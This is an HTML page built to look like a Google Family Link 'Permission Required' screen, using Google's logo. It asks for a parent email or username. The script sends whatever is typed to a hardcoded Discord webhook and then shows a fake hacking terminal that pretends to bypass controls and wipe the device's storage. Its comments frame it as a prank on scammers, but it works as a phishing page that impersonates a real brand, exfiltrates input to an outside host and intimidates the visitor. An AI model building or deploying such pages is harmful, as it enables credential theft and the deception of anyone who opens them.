<!DOCTYPE html>
<html>
<head>
    <title>Google Family Link - Permission Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --bg: #ffffff; --text: #202124; --input: #f1f3f4; }
        @media (prefers-color-scheme: dark) { :root { --bg: #202124; --text: #e8eaed; --input: #3c4043; } }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Roboto', sans-serif; overflow-x: hidden; }
        
        /* GMAIL BAIT SCREEN */
        #bait-screen { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
        .g-logo { width: 75px; margin-bottom: 20px; }
        input { background: var(--input); border: 1px solid #dadce0; padding: 15px; border-radius: 8px; width: 100%; max-width: 300px; color: var(--text); margin-bottom: 20px; }
        .next-btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }

        /* TERMINAL SCREEN */
        #terminal-screen { display: none; background: #000; color: #0f0; font-family: 'Courier New', monospace; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; }
        .red { color: #ff3131; font-weight: bold; }
        #stop-btn { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #ff3131; color: white; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; z-index: 100; }
    </style>
</head>
<body>

    <div id="bait-screen">
        <img class="g-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        <h2>Permission Required</h2>
        <p>A parent or guardian must verify this action.</p>
        <input type="email" id="user-email" placeholder="Enter parent email or username">
        <button class="next-btn" onclick="startPrank()">Next</button>
    </div>

    <div id="terminal-screen">
        <div id="term-content"></div>
        <button id="stop-btn" onclick="triggerRoast()">ABORT SYSTEM OVERRIDE</button>
    </div>

<script>
    const bScreen = document.getElementById('bait-screen');
    const tScreen = document.getElementById('terminal-screen');
    const content = document.getElementById('term-content');
    const btn = document.getElementById('stop-btn');
    const hook = "https://discordapp.com/api/webhooks/1496852933973774409/jD_cQ3GByRfVCxmAAwLbtxct4hKw64iI9knEPtCl731wROqZngJro8nQdhDz29yCxTSZ";

    function send(msg) {
        fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: msg}) }).catch(e => {});
    }

    async function writeLine(text, color = "") {
        const div = document.createElement('div');
        if (color) div.className = color;
        content.appendChild(div);
        for (let char of text) {
            div.innerHTML += char;
            window.scrollTo(0, document.body.scrollHeight);
            await new Promise(r => setTimeout(r, 40));
        }
    }

    async function startPrank() {
        const email = document.getElementById('user-email').value;
        if(!email) return alert("Please enter an email to verify.");
        
        send(`🎣 **Scammer Caught!**\n**Email Entered:** ${email}\n**Status:** Initializing Terminal...`);
        
        bScreen.style.display = "none";
        tScreen.style.display = "block";

        await writeLine("> [SUCCESS] CONNECTION ESTABLISHED", "white");
        await writeLine(`> [INFO] TARGET_ACCOUNT: ${email}`, "white");
        await writeLine("> [WARN] BYPASSING GOOGLE_FAMILY_LINK...", "red");
        await writeLine("> ACCESSING DEVELOPER_MODE...", "white");
        
        // Fast scroll effect
        for(let i=0; i<50; i++){
            const d = document.createElement('div');
            d.innerText = "0x" + Math.random().toString(16).substr(2,8).toUpperCase() + " CACHE_DUMP_IN_PROGRESS...";
            content.appendChild(d);
            window.scrollTo(0, document.body.scrollHeight);
            await new Promise(r => setTimeout(r, 20));
        }
    }

    async function triggerRoast() {
        btn.style.display = 'none';
        content.innerHTML = "";
        send("💀 **Marshynet Win!** Scammer tried to stop it.");
        
        tScreen.style.background = "#000";
        await new Promise(r => setTimeout(r, 3000));

        await writeLine("DO YOU THINK I AM THAT DUMB? HAHAHA!", "red");
        await writeLine("> ACCESSING DEVELOPER OPTIONS...", "white");

        let p = 0;
        const loader = document.createElement('div');
        loader.className = "red";
        content.appendChild(loader);

        const jumps = [3, 9, 14, 44, 45, 48, 82, 85, 93, 99];
        for (let j of jumps) {
            loader.innerHTML = `WIPING_DEVICE_STORAGE: [${j}%]`;
            await new Promise(r => setTimeout(r, Math.random() * 1200 + 300));
        }
        
        await writeLine("SYSTEM_WIPE_COMPLETE.", "red");
        await writeLine("Bye bye scammer! :)", "white");
    }
</script>
</body>
</html>
